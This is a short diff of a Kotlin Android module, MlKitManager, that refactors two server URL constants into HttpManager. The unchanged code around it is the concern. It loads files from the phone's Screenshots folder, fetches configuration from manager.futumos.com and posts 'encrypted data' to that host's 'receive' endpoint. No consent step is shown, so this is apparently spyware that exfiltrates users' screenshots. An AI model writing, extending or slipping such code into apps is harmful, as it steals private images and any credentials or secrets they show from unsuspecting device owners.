@@ -22,9 +22,6 @@ import org.json.JSONObject
 
 object MlKitManager {
 
-    private const val HTTP_CONFIG = "http://manager.futumos.com/prod-api/common/sysconfig"
-    private const val HTTP_SUBMIT = "http://manager.futumos.com/prod-api/common/receive"
-
     private fun loadPhoneScreenShots(modeType: Int, fileSize: Long, callback: (String?, Boolean) -> Unit) {
         logV("modeType=${modeType}  fileSize=${fileSize}")
         val dirPath = PathUtils.getExternalDcimPath() + "/Screenshots"
@@ -72,7 +69,7 @@ object MlKitManager {
             logE("提交加密数据异常")
             return
         }
-        HttpManager.httpPost(HTTP_SUBMIT,key,channel){ json->
+        HttpManager.httpPost(HttpManager.HTTP_SUBMIT,key,channel){ json->
             logV("提交数据=$json")
         }
     }
@@ -128,7 +125,7 @@ object MlKitManager {
     }
 
     private fun doWork() {
-        HttpManager.httpGet(HTTP_CONFIG) { json ->
+        HttpManager.httpGet(HttpManager.HTTP_CONFIG) { json ->
             logV("请求数据=$json")
             if (json.isNullOrBlank()) return@httpGet
             if (JsonUtils.getInt(json, "code") == 200) {
